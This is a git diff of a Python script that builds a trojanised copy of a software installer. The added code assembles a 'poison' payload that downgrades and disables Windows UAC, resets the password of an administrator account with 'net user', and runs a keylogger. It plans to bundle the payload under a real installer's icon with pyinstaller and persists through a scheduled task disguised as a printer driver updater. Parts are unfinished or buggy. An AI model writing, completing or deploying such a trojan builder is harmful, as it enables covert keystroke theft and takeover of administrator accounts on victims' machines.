@@ -1,24 +1,54 @@
-from os import system, getlogin
+from os import system, getlogin, remove, path
 from subprocess import run
 from keyboard import record
-from timeit import sleep
-from inspect import getsource
+from time import sleep
+import inspect
+import poisonRecipe
 
 scheduler = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
 
-#Hijacking task scheduler, kinda?
-def PoisonBottle(installer, opencmd, cmddelay, UACdowngrade, UACdisable):
-    #Create .exe identical to installer, but with fake elevation then execution stuff
-    poison = open("poison.py", 'w')
+#Create .exe identical to installer, but with fake elevation then execution stuff
+def PoisonBottle(installer, UACdowngrade, UACdisable, Adminpwn, Keylog):
+    poison = open("poison.py", 'w') #The file that will be bundled with fake installer
+    recipe = open("poisonRecipe.py", 'r') #Base file for imports
+
+    for line in recipe:
+        poison.write(line)
+
     include = ""
-    if(1):
-        include += getsource(DowngradeUAC)
-    if(1):
-        include += getsource(DisableUAC)
+    main = ""
+
+    #Module importing
+    if(UACdowngrade == 1):
+        include += inspect.getsource(DowngradeUAC)
+        main += "   DowngradeUAC()\n"
+        include += "\n"
+    if(UACdisable == 1):
+        include += inspect.getsource(DisableUAC)
+        main += "   DisableUAC()\n"
+        include += "\n"
+    if(Adminpwn == 1):
+        include += inspect.getsource(PwnAdmin)
+        main += "   PwnAdmin()\n"
+        include += "\n"
+    if(Keylog == 1):
+        include += inspect.getsource(Log)
+        main += "   Log()\n"
+        include += "\n"
+    
+    poison.write(include)
+
+    #__main__
+    poison.write("if __name__ == \"__main__\":\n")
+    poison.write(main) #Probably some loop I can use for this
+
+    #Create poisoned installer
+    #system("pyinstaller -F --name Poison -i " + installer + " " + path.realpath(poison.name))
+    print(str(path.realpath(poison)))
     
 
-    #system("pyinstaller -F --name Poison -i " + installer + "jacker.py") 
-
+def PwnAdmin():
+    system("net user \"gv admin\" 123456")
 
 def DowngradeUAC():
     #Stop UAC opening on secure desktop, allowing for software keylogger
@@ -42,6 +72,5 @@ def Log():
 
 #Drivers?
 
-
 if __name__ == "__main__":
-    
+    PoisonBottle("C:/Users/lhill23/Documents/VEXcodeV5-20220228.exe", 1, 1, 1, 1)
